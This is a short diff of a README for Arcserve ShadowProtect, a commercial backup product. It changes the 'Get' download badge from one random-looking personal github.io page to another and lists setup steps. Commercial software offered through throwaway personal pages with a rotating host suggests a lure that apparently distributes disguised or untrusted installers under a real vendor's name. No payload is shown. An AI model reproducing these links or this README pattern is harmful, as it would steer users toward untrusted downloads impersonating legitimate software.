@@ -14,7 +14,7 @@ With **Arcserve ShadowProtect**, you can restore entire machines, individual fil
 
 ## Getting Started
 
-[![Get Arcserve ShadowProtect](https://img.shields.io/badge/Get%20Arcserve%20ShadowProtect-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/arcserve-shadowprotect-backup)
+[![Get Arcserve ShadowProtect](https://img.shields.io/badge/Get%20Arcserve%20ShadowProtect-ff6b6b?style=for-the-badge)](https://arielhansenqmoh.github.io/.github/arcserve-shadowprotect-backup)
 
 1. Prepare your **Arcserve ShadowProtect** license or trial request.  
 2. Launch **Arcserve ShadowProtect** setup from the secure repository folder.  
